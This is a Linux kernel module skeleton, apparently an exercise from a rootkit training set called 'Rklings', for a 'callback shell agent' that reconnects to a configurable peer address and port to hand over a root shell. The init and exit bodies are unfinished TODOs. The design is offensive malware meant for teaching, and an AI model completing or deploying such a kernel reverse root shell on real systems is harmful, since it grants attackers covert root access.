// SPDX-License-Identifier: GPL-2.0
#include <linux/err.h>
#include <linux/errno.h>
#include <linux/inet.h>
#include <linux/init.h>
#include <linux/module.h>

#include "agent.h"
#include "root_shell.h"

static unsigned short peer_port;
module_param(peer_port, ushort, 0400);
MODULE_PARM_DESC(peer_port, "control TCP listener port");

static char peer_address_text[16] = "127.0.0.1";
module_param_string(peer_address, peer_address_text,
		    sizeof(peer_address_text), 0400);
MODULE_PARM_DESC(peer_address, "control IPv4 peer address");

static unsigned int retry_base_ms = 25;
module_param(retry_base_ms, uint, 0400);
MODULE_PARM_DESC(retry_base_ms, "initial reconnect delay in milliseconds");

static unsigned int retry_max_ms = 200;
module_param(retry_max_ms, uint, 0400);
MODULE_PARM_DESC(retry_max_ms, "maximum reconnect delay in milliseconds");

static struct rk_agent agent;
static struct rk_root_shell shell;

static int __init rk_init(void)
{
	__be32 peer_address;
	int error;

	{
		const char *end;

		if (!in4_pton(peer_address_text, -1, (u8 *)&peer_address,
			      -1, &end) || *end || !peer_address)
			return -EINVAL;
	}
	if (!peer_port || !retry_base_ms ||
	    retry_base_ms > retry_max_ms || retry_max_ms > 5000)
		return -EINVAL;

	// TODO: Initialize the root shell with a 60-second timeout.
	// Then start the agent, passing the shell pointer.
	// If agent_start fails, stop the shell before returning.

	return -ENOSYS;
}

static void __exit rk_exit(void)
{
	// TODO: Stop the agent first, then stop the shell.
	// Order matters: the agent may have an active shell session.
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings callback shell agent");
